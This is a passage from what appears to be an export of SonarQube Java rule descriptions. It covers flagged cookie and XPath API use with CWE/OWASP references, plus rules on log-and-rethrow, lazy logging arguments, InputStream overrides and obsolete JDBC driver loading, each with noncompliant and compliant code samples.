  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7772"">CVE-2018-7772</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10085"">CVE-2018-10085</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6537"">CVE-2016-6537</a> </li>
</ul>
<p>Attackers can use widely-available tools to read and modify cookies, thus:</p>
<ul>
  <li> sensitive information written by the server will be exposed. </li>
  <li> cookies sent by the client can be crafted to attack server vulnerabilities. </li>
</ul>
<p>This rule flags code that reads or writes cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> sensitive information is stored inside the cookie. </li>
  <li> cookie values are used without being first sanitized. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Cookies should only be used to manage the user session. The best practice is to keep all user-related information server-side and link them to the
user session, never sending them to the client. In a very few corner cases, cookies can be used for non-sensitive information that need to live longer
than the user session.</p>
<p>Do not try to encode sensitive information in a non human-readable format before writing them in a cookie. The encoding can be reverted and the
original information will be exposed.</p>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> every information read from a cookie before using them.</p>
<p>Using cookies only for session IDs doesn't make them secure. Follow <a
href=""https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Cookies"">OWASP best practices</a> when you configure your cookies.</p>
<h2>Questionable Code Example</h2>
<pre>
// === javax.servlet ===
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpServletRequest;

public class JavaxServlet {
    void aServiceMethodSettingCookie(HttpServletRequest request, HttpServletResponse response, String acctID) {
        Cookie cookie = new Cookie(""userAccountID"", acctID);  // Questionable
        response.addCookie(cookie);  // Questionable

        cookie.getValue();  // Questionable. Check how the value is used.
    }
}
</pre>
<pre>
// === javax.ws ===
import java.util.Date;
import javax.ws.rs.core.Cookie;
import javax.ws.rs.core.NewCookie;

class JavaxWs {
    void jaxRsCookie(String comment, int maxAge, boolean secure, Date expiry, boolean httpOnly, String name,
            String value, String path, String domain, int version) {
        Cookie cookie= new Cookie(""name"", ""value"");  // Questionable
        cookie.getValue();  // Questionable

        new NewCookie(cookie);  // Questionable
        new NewCookie(cookie, comment, maxAge, secure);
        new NewCookie(cookie, comment, maxAge, expiry, secure, httpOnly);
        new NewCookie(name, value);
        new NewCookie(name, value, path, domain, version, comment, maxAge, secure);
        new NewCookie(name, value, path, domain, version, comment, maxAge, expiry, secure, httpOnly);
        new NewCookie(name, value, path, domain, comment, maxAge, secure);
        new NewCookie(name, value, path, domain, comment, maxAge, secure, httpOnly);
    }
}
</pre>
<pre>
// === java.net ===
import java.net.HttpCookie;

class JavaNet {
    void httpCookie(HttpCookie hc) {
        HttpCookie cookie = new HttpCookie(""name"", ""value"");  // Questionable
        cookie.setValue(""value"");  // Questionable
        cookie.getValue();  // Questionable
    }
}
</pre>
<pre>
// === apache.shiro ===
import org.apache.shiro.web.servlet.SimpleCookie;

class ApacheShiro {

    void shiroCookie(SimpleCookie cookie) {
        SimpleCookie sc = new SimpleCookie(cookie);  // Questionable
        cookie.setValue(""value"");  // Questionable
        cookie.getValue();  // Questionable
    }
}
</pre>
<pre>
// === spring ===
import org.springframework.security.web.savedrequest.SavedCookie;
import org.springframework.web.bind.annotation.CookieValue;
import org.springframework.web.bind.annotation.RequestMapping;
import javax.servlet.http.Cookie;

class Spring {
    @RequestMapping(""/mypage.html"")
    // Questionable. Ã¢â‚¬Å“myCookieÃ¢â‚¬ï¿½ value is read from a cookie.
    public String myPage(@CookieValue(""cookieName"") String myCookie) {
        return ""test"";
    }

    void springCookie(Cookie cookie) {
        SavedCookie savedCookie = new SavedCookie(cookie); // Questionable
        cookie.getValue(); // Questionable
    }
}
</pre>
<pre>
// === Play ===
import play.mvc.Http.Cookie;
import play.mvc.Http.CookieBuilder;
import scala.language;


class Play {
    void playCookie(Cookie cookie) {
        cookie.value();  // Questionable

        CookieBuilder builder = Cookie.builder(""name"", ""value"");  // Questionable
        builder.withName(""name"")
          .withValue(""value"")  // Questionable
          .build();

    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/312.html"">MITRE, CWE-312</a> - Cleartext Storage of Sensitive Information </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/315.html"">MITRE, CWE-315</a> - Cleartext Storage of Sensitive Information in a Cookie </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/565.html"">MITRE CWE-565</a> - Reliance on Cookies without Validation and Integrity Checking
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://wiki.sei.cmu.edu/confluence/display/java/FIO52-J.+Do+not+store+unencrypted+sensitive+information+on+the+client+side"">CERT,
  FIO52-J.</a> - Do not store unencrypted sensitive information on the client side </li>
  <li> Derived from FindSecBugs rule <a href=""https://find-sec-bugs.github.io/bugs.htm#COOKIE_USAGE"">COOKIE_USAGE</a> </li>
</ul>",squid:S2255,java,Java,"<p>Using cookies is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7772"">CVE-2018-7772</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10085"">CVE-2018-10085</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6537"">CVE-2016-6537</a> </li>
</ul>
<p>Attackers can use widely-available tools to read and modify cookies, thus:</p>
<ul>
  <li> sensitive information written by the server will be exposed. </li>
  <li> cookies sent by the client can be crafted to attack server vulnerabilities. </li>
</ul>
<p>This rule flags code that reads or writes cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> sensitive information is stored inside the cookie. </li>
  <li> cookie values are used without being first sanitized. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Cookies should only be used to manage the user session. The best practice is to keep all user-related information server-side and link them to the
user session, never sending them to the client. In a very few corner cases, cookies can be used for non-sensitive information that need to live longer
than the user session.</p>
<p>Do not try to encode sensitive information in a non human-readable format before writing them in a cookie. The encoding can be reverted and the
original information will be exposed.</p>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> every information read from a cookie before using them.</p>
<p>Using cookies only for session IDs doesn't make them secure. Follow <a
href=""https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Cookies"">OWASP best practices</a> when you configure your cookies.</p>
<h2>Questionable Code Example</h2>
<pre>
// === javax.servlet ===
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpServletRequest;

public class JavaxServlet {
    void aServiceMethodSettingCookie(HttpServletRequest request, HttpServletResponse response, String acctID) {
        Cookie cookie = new Cookie(""userAccountID"", acctID);  // Questionable
        response.addCookie(cookie);  // Questionable

        cookie.getValue();  // Questionable. Check how the value is used.
    }
}
</pre>
<pre>
// === javax.ws ===
import java.util.Date;
import javax.ws.rs.core.Cookie;
import javax.ws.rs.core.NewCookie;

class JavaxWs {
    void jaxRsCookie(String comment, int maxAge, boolean secure, Date expiry, boolean httpOnly, String name,
            String value, String path, String domain, int version) {
        Cookie cookie= new Cookie(""name"", ""value"");  // Questionable
        cookie.getValue();  // Questionable

        new NewCookie(cookie);  // Questionable
        new NewCookie(cookie, comment, maxAge, secure);
        new NewCookie(cookie, comment, maxAge, expiry, secure, httpOnly);
        new NewCookie(name, value);
        new NewCookie(name, value, path, domain, version, comment, maxAge, secure);
        new NewCookie(name, value, path, domain, version, comment, maxAge, expiry, secure, httpOnly);
        new NewCookie(name, value, path, domain, comment, maxAge, secure);
        new NewCookie(name, value, path, domain, comment, maxAge, secure, httpOnly);
    }
}
</pre>
<pre>
// === java.net ===
import java.net.HttpCookie;

class JavaNet {
    void httpCookie(HttpCookie hc) {
        HttpCookie cookie = new HttpCookie(""name"", ""value"");  // Questionable
        cookie.setValue(""value"");  // Questionable
        cookie.getValue();  // Questionable
    }
}
</pre>
<pre>
// === apache.shiro ===
import org.apache.shiro.web.servlet.SimpleCookie;

class ApacheShiro {

    void shiroCookie(SimpleCookie cookie) {
        SimpleCookie sc = new SimpleCookie(cookie);  // Questionable
        cookie.setValue(""value"");  // Questionable
        cookie.getValue();  // Questionable
    }
}
</pre>
<pre>
// === spring ===
import org.springframework.security.web.savedrequest.SavedCookie;
import org.springframework.web.bind.annotation.CookieValue;
import org.springframework.web.bind.annotation.RequestMapping;
import javax.servlet.http.Cookie;

class Spring {
    @RequestMapping(""/mypage.html"")
    // Questionable. Ã¢â‚¬Å“myCookieÃ¢â‚¬ï¿½ value is read from a cookie.
    public String myPage(@CookieValue(""cookieName"") String myCookie) {
        return ""test"";
    }

    void springCookie(Cookie cookie) {
        SavedCookie savedCookie = new SavedCookie(cookie); // Questionable
        cookie.getValue(); // Questionable
    }
}
</pre>
<pre>
// === Play ===
import play.mvc.Http.Cookie;
import play.mvc.Http.CookieBuilder;
import scala.language;


class Play {
    void playCookie(Cookie cookie) {
        cookie.value();  // Questionable

        CookieBuilder builder = Cookie.builder(""name"", ""value"");  // Questionable
        builder.withName(""name"")
          .withValue(""value"")  // Questionable
          .build();

    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/312.html"">MITRE, CWE-312</a> - Cleartext Storage of Sensitive Information </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/315.html"">MITRE, CWE-315</a> - Cleartext Storage of Sensitive Information in a Cookie </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/565.html"">MITRE CWE-565</a> - Reliance on Cookies without Validation and Integrity Checking
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://wiki.sei.cmu.edu/confluence/display/java/FIO52-J.+Do+not+store+unencrypted+sensitive+information+on+the+client+side"">CERT,
  FIO52-J.</a> - Do not store unencrypted sensitive information on the client side </li>
  <li> Derived from FindSecBugs rule <a href=""https://find-sec-bugs.github.io/bugs.htm#COOKIE_USAGE"">COOKIE_USAGE</a> </li>
</ul>",Using cookies is security-sensitive,[],MINOR,"['cert', 'cwe', 'owasp-a1', 'owasp-a3', 'sans-top25-porous']",SECURITY_HOTSPOT
2018-11-12T11:11:26+0100,"<p>In applications where the accepted practice is to log an <code>Exception</code> and then rethrow it, you end up with miles-long logs that contain
multiple instances of the same exception. In multi-threaded applications debugging this type of log can be particularly hellish because messages from
other threads will be interwoven with the repetitions of the logged-and-thrown <code>Exception</code>. Instead, exceptions should be either logged or
rethrown, not both.</p>
<h2>Noncompliant Code Example</h2>
<pre>
catch (SQLException e) {
  ...
  LOGGER.log(Level.ERROR,  contextInfo, e);
  throw new MySQLException(contextInfo, e);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
catch (SQLException e) {
  ...
  throw new MySQLException(contextInfo, e);
}
</pre>
<p>or </p>
<pre>
catch (SQLException e) {
  ...
  LOGGER.log(Level.ERROR,  contextInfo, e);
  // handle exception...
}
</pre>",squid:S2139,java,Java,"<p>In applications where the accepted practice is to log an <code>Exception</code> and then rethrow it, you end up with miles-long logs that contain
multiple instances of the same exception. In multi-threaded applications debugging this type of log can be particularly hellish because messages from
other threads will be interwoven with the repetitions of the logged-and-thrown <code>Exception</code>. Instead, exceptions should be either logged or
rethrown, not both.</p>
<h2>Noncompliant Code Example</h2>
<pre>
catch (SQLException e) {
  ...
  LOGGER.log(Level.ERROR,  contextInfo, e);
  throw new MySQLException(contextInfo, e);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
catch (SQLException e) {
  ...
  throw new MySQLException(contextInfo, e);
}
</pre>
<p>or </p>
<pre>
catch (SQLException e) {
  ...
  LOGGER.log(Level.ERROR,  contextInfo, e);
  // handle exception...
}
</pre>",Exceptions should be either logged or rethrown but not both,[],MAJOR,"['clumsy', 'error-handling']",CODE_SMELL
2017-01-06T12:29:49+0100,"<p>Passing message arguments that require further evaluation into a Guava <code>com.google.common.base.Preconditions</code> check can result in a
performance penalty. That's because whether or not they're needed, each argument must be resolved before the method is actually called.</p>
<p>Similarly, passing concatenated strings into a logging method can also incur a needless performance hit because the concatenation will be performed
every time the method is called, whether or not the log level is low enough to show the message.</p>
<p>Instead, you should structure your code to pass static or pre-computed values into <code>Preconditions</code> conditions check and logging
calls.</p>
<p>Specifically, the built-in string formatting should be used instead of string concatenation, and if the message is the result of a method call,
then <code>Preconditions</code> should be skipped altoghether, and the relevant exception should be conditionally thrown instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
logger.log(Level.DEBUG, ""Something went wrong: "" + message);  // Noncompliant; string concatenation performed even when log level too high to show DEBUG messages

logger.fine(""An exception occurred with message: "" + message); // Noncompliant

LOG.error(""Unable to open file "" + csvPath, e);  // Noncompliant

Preconditions.checkState(a &gt; 0, ""Arg must be positive, but got "" + a);  // Noncompliant. String concatenation performed even when a &gt; 0

Preconditions.checkState(condition, formatMessage());  // Noncompliant. formatMessage() invoked regardless of condition

Preconditions.checkState(condition, ""message: %s"", formatMessage());  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
logger.log(Level.SEVERE, ""Something went wrong: {0} "", message);  // String formatting only applied if needed

logger.fine(""An exception occurred with message: {}"", message);  // SLF4J, Log4j

logger.log(Level.SEVERE, () -&gt; ""Something went wrong: "" + message); // since Java 8, we can use Supplier , which will be evaluated lazily

LOG.error(""Unable to open file {0}"", csvPath, e);

if (LOG.isDebugEnabled() {
  LOG.debug(""Unable to open file "" + csvPath, e);  // this is compliant, because it will not evaluate if log level is above debug.
}

Preconditions.checkState(arg &gt; 0, ""Arg must be positive, but got %d"", a);  // String formatting only applied if needed

if (!condition) {
  throw new IllegalStateException(formatMessage());  // formatMessage() only invoked conditionally
}

if (!condition) {
  throw new IllegalStateException(""message: "" + formatMessage());
}
</pre>
<h2>Exceptions</h2>
<p><code>catch</code> blocks are ignored, because the performance penalty is unimportant on exceptional paths (catch block should not be a part of
standard program flow). Getters are ignored as well as methods called on annotations which can be considered as getters. This rule accounts for
explicit test-level testing with SLF4J methods <code>isXXXEnabled</code> and ignores the bodies of such <code>if</code> statements.</p>",squid:S2629,java,Java,"<p>Passing message arguments that require further evaluation into a Guava <code>com.google.common.base.Preconditions</code> check can result in a
performance penalty. That's because whether or not they're needed, each argument must be resolved before the method is actually called.</p>
<p>Similarly, passing concatenated strings into a logging method can also incur a needless performance hit because the concatenation will be performed
every time the method is called, whether or not the log level is low enough to show the message.</p>
<p>Instead, you should structure your code to pass static or pre-computed values into <code>Preconditions</code> conditions check and logging
calls.</p>
<p>Specifically, the built-in string formatting should be used instead of string concatenation, and if the message is the result of a method call,
then <code>Preconditions</code> should be skipped altoghether, and the relevant exception should be conditionally thrown instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
logger.log(Level.DEBUG, ""Something went wrong: "" + message);  // Noncompliant; string concatenation performed even when log level too high to show DEBUG messages

logger.fine(""An exception occurred with message: "" + message); // Noncompliant

LOG.error(""Unable to open file "" + csvPath, e);  // Noncompliant

Preconditions.checkState(a &gt; 0, ""Arg must be positive, but got "" + a);  // Noncompliant. String concatenation performed even when a &gt; 0

Preconditions.checkState(condition, formatMessage());  // Noncompliant. formatMessage() invoked regardless of condition

Preconditions.checkState(condition, ""message: %s"", formatMessage());  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
logger.log(Level.SEVERE, ""Something went wrong: {0} "", message);  // String formatting only applied if needed

logger.fine(""An exception occurred with message: {}"", message);  // SLF4J, Log4j

logger.log(Level.SEVERE, () -&gt; ""Something went wrong: "" + message); // since Java 8, we can use Supplier , which will be evaluated lazily

LOG.error(""Unable to open file {0}"", csvPath, e);

if (LOG.isDebugEnabled() {
  LOG.debug(""Unable to open file "" + csvPath, e);  // this is compliant, because it will not evaluate if log level is above debug.
}

Preconditions.checkState(arg &gt; 0, ""Arg must be positive, but got %d"", a);  // String formatting only applied if needed

if (!condition) {
  throw new IllegalStateException(formatMessage());  // formatMessage() only invoked conditionally
}

if (!condition) {
  throw new IllegalStateException(""message: "" + formatMessage());
}
</pre>
<h2>Exceptions</h2>
<p><code>catch</code> blocks are ignored, because the performance penalty is unimportant on exceptional paths (catch block should not be a part of
standard program flow). Getters are ignored as well as methods called on annotations which can be considered as getters. This rule accounts for
explicit test-level testing with SLF4J methods <code>isXXXEnabled</code> and ignores the bodies of such <code>if</code> statements.</p>","""Preconditions"" and logging arguments should not require evaluation",[],MAJOR,['performance'],CODE_SMELL
2018-11-12T11:11:26+0100,"<p>When directly subclassing <code>java.io.InputStream</code> or <code>java.io.FilterInputStream</code>, the only requirement is that you implement
the method <code>read()</code>. However most uses for such streams don't read a single byte at a time and the default implementation for
<code>read(byte[],int,int)</code> will call <code>read(int)</code> for every single byte in the array which can create a lot of overhead and is
utterly inefficient. It is therefore strongly recommended that subclasses provide an efficient implementation of
<code>read(byte[],int,int)</code>.</p>
<p>This rule raises an issue when a direct subclass of <code>java.io.InputStream</code> or <code>java.io.FilterInputStream</code> doesn't provide an
override of <code>read(byte[],int,int)</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyInputStream extends java.io.InputStream {
  private FileInputStream fin;

  public MyInputStream(File file) throws IOException {
    fin = new FileInputStream(file);
  }

  @Override
  public int read() throws IOException {
    return fin.read();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyInputStream extends java.io.InputStream {
  private FileInputStream fin;

  public MyInputStream(File file) throws IOException {
    fin = new FileInputStream(file);
  }

  @Override
  public int read() throws IOException {
    return fin.read();
  }

  @Override
  public int read(byte[] b, int off, int len) throws IOException {
    return fin.read(b, off, len);
  }
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise an issue when the class is declared <code>abstract</code>.</p>",squid:S4929,java,Java,"<p>When directly subclassing <code>java.io.InputStream</code> or <code>java.io.FilterInputStream</code>, the only requirement is that you implement
the method <code>read()</code>. However most uses for such streams don't read a single byte at a time and the default implementation for
<code>read(byte[],int,int)</code> will call <code>read(int)</code> for every single byte in the array which can create a lot of overhead and is
utterly inefficient. It is therefore strongly recommended that subclasses provide an efficient implementation of
<code>read(byte[],int,int)</code>.</p>
<p>This rule raises an issue when a direct subclass of <code>java.io.InputStream</code> or <code>java.io.FilterInputStream</code> doesn't provide an
override of <code>read(byte[],int,int)</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyInputStream extends java.io.InputStream {
  private FileInputStream fin;

  public MyInputStream(File file) throws IOException {
    fin = new FileInputStream(file);
  }

  @Override
  public int read() throws IOException {
    return fin.read();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyInputStream extends java.io.InputStream {
  private FileInputStream fin;

  public MyInputStream(File file) throws IOException {
    fin = new FileInputStream(file);
  }

  @Override
  public int read() throws IOException {
    return fin.read();
  }

  @Override
  public int read(byte[] b, int off, int len) throws IOException {
    return fin.read(b, off, len);
  }
}
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise an issue when the class is declared <code>abstract</code>.</p>","""read(byte[],int,int)"" should be overridden",[],MINOR,['performance'],CODE_SMELL
2018-11-12T11:11:26+0100,"<p>In the past, it was required to load a JDBC driver before creating a <code>java.sql.Connection</code>. Nowadays, when using JDBC 4.0 drivers, this
is no longer required and <code>Class.forName()</code> can be safely removed because JDBC 4.0 (JDK 6) drivers available in the classpath are
automatically loaded.</p>
<p>This rule raises an issue when <code>Class.forName()</code> is used with one of the following values:</p>
<ul>
  <li> <code>com.mysql.jdbc.Driver</code> </li>
  <li> <code>oracle.jdbc.driver.OracleDriver</code> </li>
  <li> <code>com.ibm.db2.jdbc.app.DB2Driver</code> </li>
  <li> <code>com.ibm.db2.jdbc.net.DB2Driver</code> </li>
  <li> <code>com.sybase.jdbc.SybDriver</code> </li>
  <li> <code>com.sybase.jdbc2.jdbc.SybDriver</code> </li>
  <li> <code>com.teradata.jdbc.TeraDriver</code> </li>
  <li> <code>com.microsoft.sqlserver.jdbc.SQLServerDriver</code> </li>
  <li> <code>org.postgresql.Driver</code> </li>
  <li> <code>sun.jdbc.odbc.JdbcOdbcDriver</code> </li>
  <li> <code>org.hsqldb.jdbc.JDBCDriver</code> </li>
  <li> <code>org.h2.Driver</code> </li>
  <li> <code>org.firebirdsql.jdbc.FBDriver</code> </li>
  <li> <code>net.sourceforge.jtds.jdbc.Driver</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class Demo {
  private static final String DRIVER_CLASS_NAME = ""org.postgresql.Driver"";
  private final Connection connection;

  public Demo(String serverURI) throws SQLException, ClassNotFoundException {
    Class.forName(DRIVER_CLASS_NAME); // Noncompliant; no longer required to load the JDBC Driver using Class.forName()
    connection = DriverManager.getConnection(serverURI);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class Demo {
    private final Connection connection;

    public Demo(String serverURI) throws SQLException {
        connection = DriverManager.getConnection(serverURI);
    }
}
</pre>",squid:S4925,java,Java,"<p>In the past, it was required to load a JDBC driver before creating a <code>java.sql.Connection</code>. Nowadays, when using JDBC 4.0 drivers, this
is no longer required and <code>Class.forName()</code> can be safely removed because JDBC 4.0 (JDK 6) drivers available in the classpath are
automatically loaded.</p>
<p>This rule raises an issue when <code>Class.forName()</code> is used with one of the following values:</p>
<ul>
  <li> <code>com.mysql.jdbc.Driver</code> </li>
  <li> <code>oracle.jdbc.driver.OracleDriver</code> </li>
  <li> <code>com.ibm.db2.jdbc.app.DB2Driver</code> </li>
  <li> <code>com.ibm.db2.jdbc.net.DB2Driver</code> </li>
  <li> <code>com.sybase.jdbc.SybDriver</code> </li>
  <li> <code>com.sybase.jdbc2.jdbc.SybDriver</code> </li>
  <li> <code>com.teradata.jdbc.TeraDriver</code> </li>
  <li> <code>com.microsoft.sqlserver.jdbc.SQLServerDriver</code> </li>
  <li> <code>org.postgresql.Driver</code> </li>
  <li> <code>sun.jdbc.odbc.JdbcOdbcDriver</code> </li>
  <li> <code>org.hsqldb.jdbc.JDBCDriver</code> </li>
  <li> <code>org.h2.Driver</code> </li>
  <li> <code>org.firebirdsql.jdbc.FBDriver</code> </li>
  <li> <code>net.sourceforge.jtds.jdbc.Driver</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class Demo {
  private static final String DRIVER_CLASS_NAME = ""org.postgresql.Driver"";
  private final Connection connection;

  public Demo(String serverURI) throws SQLException, ClassNotFoundException {
    Class.forName(DRIVER_CLASS_NAME); // Noncompliant; no longer required to load the JDBC Driver using Class.forName()
    connection = DriverManager.getConnection(serverURI);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;

public class Demo {
    private final Connection connection;

    public Demo(String serverURI) throws SQLException {
        connection = DriverManager.getConnection(serverURI);
    }
}
</pre>","""Class.forName()"" should not load JDBC 4.0+ drivers",[],MAJOR,['obsolete'],CODE_SMELL
2018-11-12T11:11:26+0100,"<p>Executing XPATH expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6272"">CVE-2016-6272</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9149"">CVE-2016-9149</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4837"">CVE-2012-4837</a> </li>
</ul>
<p>User provided data such as URL parameters should always be considered as untrusted and tainted. Constructing XPath expressions directly from
tainted data enables attackers to inject specially crafted values that changes the initial meaning of the expression itself. Successful XPath
injections attacks can read sensitive information from the XML document.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the XPATH expression might contain some unsafe input coming from a user. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Sanitize any user input before using it in an XPATH expression.</p>
<h2>Questionable Code Example</h2>
<pre>
// === javax.xml.xpath.XPath ===
import javax.xml.namespace.QName;
import javax.xml.xpath.XPath;

import org.xml.sax.InputSource;

class M {
    void foo(XPath xpath, String expression, InputSource source, QName returnType, Object item) throws Exception {
        xpath.compile(expression); // Questionable
        xpath.evaluate(expression, source); // Questionable
        xpath.evaluate(expression, source, returnType); // Questionable
        xpath.evaluate(expression, item); // Questionable
        xpath.evaluate(expression, item, returnType); // Questionable
    }
}
</pre>
<pre>
// === Apache XML Security ===
import org.apache.xml.utils.PrefixResolver;
import org.apache.xml.security.utils.XPathAPI;
import org.w3c.dom.Node;

class M {
    void foo(XPathAPI api, Node contextNode, String str, Node namespaceNode, PrefixResolver prefixResolver,
            Node xpathnode) throws Exception {
        api.evaluate(contextNode, xpathnode, str, namespaceNode); // Questionable
        api.selectNodeList(contextNode, xpathnode, str, namespaceNode); // Questionable
    }
}
</pre>
<pre>
// === Apache Xalan ===
import org.apache.xml.utils.PrefixResolver;
import org.apache.xpath.XPathAPI;
import org.w3c.dom.Node;

class M {
    void foo(XPathAPI api, Node contextNode, String str, Node namespaceNode, PrefixResolver prefixResolver)
            throws Exception {
        XPathAPI.eval(contextNode, str); // Questionable
        XPathAPI.eval(contextNode, str, namespaceNode); // Questionable
        XPathAPI.eval(contextNode, str, prefixResolver); // Questionable
        XPathAPI.selectNodeIterator(contextNode, str); // Questionable
        XPathAPI.selectNodeIterator(contextNode, str, namespaceNode); // Questionable
        XPathAPI.selectNodeList(contextNode, str); // Questionable
        XPathAPI.selectNodeList(contextNode, str, namespaceNode); // Questionable
        XPathAPI.selectSingleNode(contextNode, str); // Questionable
        XPathAPI.selectSingleNode(contextNode, str, namespaceNode); // Questionable
    }
}
</pre>
<pre>
// === org.apache.commons.jxpath ===
import org.apache.commons.jxpath.JXPathContext;

abstract class A extends JXPathContext{
    A(JXPathContext compilationContext, Object contextBean) {
        super(compilationContext, contextBean);
    }


    void foo(JXPathContext context, String str, Object obj, Class&lt;?&gt; requiredType) {
        JXPathContext.compile(str); // Questionable
        this.compilePath(str); // Questionable
        context.createPath(str); // Questionable
        context.createPathAndSetValue(str, obj); // Questionable
        context.getPointer(str); // Questionable
        context.getValue(str); // Questionable
        context.getValue(str, requiredType); // Questionable
        context.iterate(str); // Questionable
        context.iteratePointers(str); // Questionable
        context.removeAll(str); // Questionable
        context.removePath(str); // Questionable
        context.selectNodes(str); // Questionable
        context.selectSingleNode(str); // Questionable
        context.setValue(str, obj); // Questionable
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/643"">MITRE, CWE-643</a> - Improper Neutralization of Data within XPath Expressions </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/BwLEAw"">CERT, IDS53-J.</a> - Prevent XPath Injection </li>
</ul>",squid:S4817,java,Java,"<p>Executing XPATH expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6272"">CVE-2016-6272</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9149"">CVE-2016-9149</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4837"">CVE-2012-4837</a> </li>
</ul>
<p>User provided data such as URL parameters should always be considered as untrusted and tainted. Constructing XPath expressions directly from
tainted data enables attackers to inject specially crafted values that changes the initial meaning of the expression itself. Successful XPath
injections attacks can read sensitive information from the XML document.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the XPATH expression might contain some unsafe input coming from a user. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Sanitize any user input before using it in an XPATH expression.</p>
<h2>Questionable Code Example</h2>
<pre>
// === javax.xml.xpath.XPath ===
import javax.xml.namespace.QName;
import javax.xml.xpath.XPath;

import org.xml.sax.InputSource;

class M {
    void foo(XPath xpath, String expression, InputSource source, QName returnType, Object item) throws Exception {
        xpath.compile(expression); // Questionable
        xpath.evaluate(expression, source); // Questionable
        xpath.evaluate(expression, source, returnType); // Questionable
        xpath.evaluate(expression, item); // Questionable
        xpath.evaluate(expression, item, returnType); // Questionable
    }
}
</pre>
<pre>
// === Apache XML Security ===
import org.apache.xml.utils.PrefixResolver;
import org.apache.xml.security.utils.XPathAPI;
import org.w3c.dom.Node;

class M {
    void foo(XPathAPI api, Node contextNode, String str, Node namespaceNode, PrefixResolver prefixResolver,
            Node xpathnode) throws Exception {
        api.evaluate(contextNode, xpathnode, str, namespaceNode); // Questionable
        api.selectNodeList(contextNode, xpathnode, str, namespaceNode); // Questionable
    }
}
</pre>
<pre>
// === Apache Xalan ===
import org.apache.xml.utils.PrefixResolver;
import org.apache.xpath.XPathAPI;
import org.w3c.dom.Node;

class M {
    void foo(XPathAPI api, Node contextNode, String str, Node namespaceNode, PrefixResolver prefixResolver)
            throws Exception {
        XPathAPI.eval(contextNode, str); // Questionable
        XPathAPI.eval(contextNode, str, namespaceNode); // Questionable
        XPathAPI.eval(contextNode, str, prefixResolver); // Questionable
